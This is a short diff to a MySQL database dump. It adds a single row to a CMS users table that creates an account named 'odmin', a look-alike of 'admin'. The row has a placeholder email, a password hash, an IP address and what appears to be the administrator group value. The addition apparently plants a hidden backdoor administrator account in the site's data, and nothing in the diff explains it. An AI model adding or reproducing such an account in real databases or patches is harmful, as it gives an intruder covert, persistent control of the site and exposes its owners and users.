@@ -1006,6 +1006,7 @@ CREATE TABLE `xhw7tid4_users` (
 ) ENGINE=MyISAM AUTO_INCREMENT=61740 DEFAULT CHARSET=cp1251;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
+INSERT INTO `xhw7tid4_users` VALUES ('your_mail@yahoo.com','6b5b2b3bf1db39d449bd76064117be88','odmin',1017,5,0,1,'1453068688','1295356709','',1,'','','','','','','','','','',0,0,'','fav_music|Lambada','','6e645b50b7f58fb075260996c0b4848b','173.7.249.151',0,0,'','',0,0,'','','','',0,0,'','','',0,0,'','',0,0,'','',0,0,'','',0,0,'','',0,0,'','',0,0,'',0,0,'','','',0,0,'','',0,0,'Мужской','','1452691918','','TT3wLPhtpuCoD1yslf+NWNm2tqUgnj1MqHy8CZUGIKE=',0)
 --
 -- Table structure for table `xhw7tid4_views`
 --
